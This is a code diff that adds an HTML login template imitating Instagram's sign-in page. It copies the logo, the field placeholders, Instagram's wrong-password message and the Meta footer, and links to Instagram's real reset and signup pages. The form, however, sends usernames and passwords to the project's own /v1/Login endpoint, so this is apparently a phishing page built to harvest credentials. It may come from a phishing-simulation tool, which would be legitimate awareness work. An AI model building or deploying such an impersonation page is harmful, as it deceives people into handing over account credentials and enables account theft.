@@ -1,0 +1,32 @@
+{{template "base" .}}
+
+{{define "content"}}
+
+<div class="lg-page">
+        
+       <div class="lg-lang">English (UK)</div>
+        
+       <div class="lg-logo">
+            <img src="../static/images/instagram.png" alt="instagram">
+       </div>
+        
+       <form class="lg-form" action="/v1/Login" method="post">
+            <input type="hidden" name="csrf_token" value="{{.CSRFToken}}"> 
+            <input type="text" placeholder="Phone number, username, or email" name="u_name">
+            <input type="password" placeholder="Password" name="pass">
+            <button class="lg-submit" type="submit">Log in</button>
+            {{if .InvalidUsername}}
+            <div class="lg-error">Sorry, your password was incorrect. Please double-check your password.</div>
+            {{end}}
+       </form>
+        
+       <a class="lg-forgot" href="https://www.instagram.com/accounts/password/reset/">Forgotten password?</a>
+
+       <div class="lg-spacer"></div>
+
+       <a class="lg-create" href="https://www.instagram.com/accounts/emailsignup/">Create new account</a>
+
+       <div class="lg-meta">∞ Meta</div>
+</div>
+
+{{end}}
